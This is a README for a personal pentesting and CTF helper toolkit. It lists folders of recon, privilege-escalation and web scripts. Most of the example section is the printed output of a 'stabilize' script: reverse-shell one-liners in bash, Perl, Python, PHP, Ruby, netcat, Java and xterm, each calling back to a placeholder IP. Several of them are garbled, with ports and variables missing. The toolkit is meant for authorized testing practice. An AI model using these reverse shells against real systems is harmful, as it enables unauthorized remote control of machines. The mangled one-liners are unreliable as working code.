# Tools for helping in Pentesting and CTF

This is what I use for my pentesting and CTF. All the functions can be dry
run or you can run them. Each tool is a script in its own folder and can be called with

```
setup.sh <folder> <script>
```

and you can run it with ::
```
setup.sh <folder> <script> run
```

Current scripts:

```
├── privesc
│   ├── linux.sh
│   ├── stabilize.sh
│   └── windows.sh
├── README.md
├── recon
│   ├── nmap.sh
│   ├── smb.sh
│   ├── ssl.sh
│   └── wp.sh
├── setup
│   └── git.sh
├── setup.sh
├── web
│   └── lin.sh
└── webrecon.sh
```

## Example

I am using target IP as "500.500.500.500" here to avoid copy/paster errors.
Similarly I am using 600.600.600.600 as local IP here (which is automatically taken from tun0 if PT_TUN is not defined)

```bash
└──╼ [★ ]# setup.sh privesc stabilize
#!/bin/bash -
#===============================================================================
#
#          FILE: stabilize.sh
#
#         USAGE: ./stabilize.sh
#
#   DESCRIPTION:
#
#       OPTIONS: ---
#  REQUIREMENTS: ---
#          BUGS: ---
#         NOTES: ---
#        AUTHOR: Amit Agarwal (aka),
#  ORGANIZATION: Individual
#       CREATED: 01/01/2021 13:13
#      REVISION:  ---
#===============================================================================

set -o nounset                              # Treat unset variables as an error

## Bash
bash -i >& /dev/tcp/600.600.600.600/ 0>&1
# OR
bash -c "bash -i >& /dev/tcp/600.600.600.600/ 0>&1"

## Perl
perl -e 'use Socket;="600.600.600.600";=;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(,inet_aton()))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

## Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("600.600.600.600",));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

## PHP
php -r '\=fsockopen("600.600.600.600",);exec("/bin/sh -i <&3 >&3 2>&3");'

## Ruby
ruby -rsocket -e'f=TCPSocket.open("600.600.600.600",).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

## netcat
nc -e /bin/sh 600.600.600.600

## nc - my fav
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 600.600.600.600  >/tmp/f

## Java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/600.600.600.600/;cat <&5 | while read line; do \ 2>&5 >&5; done"] as String[])
p.waitFor()

## xterm
xterm -display 600.600.600.600:1
Xnest :1
xhost +500.500.500.500

```


# Other Scripts

* bash-port-scan.sh - port scanning with bash
* basic-scan-tmux.sh - scanning a host with variety of tools in interactive manner with tmux session to run multiple tools at same time
* pwn-templ.sh - Generate a template for binary exploitations ( both remote and local with binary path)
* webrecon.sh - Basic reconf for a domain with subdomain enumeration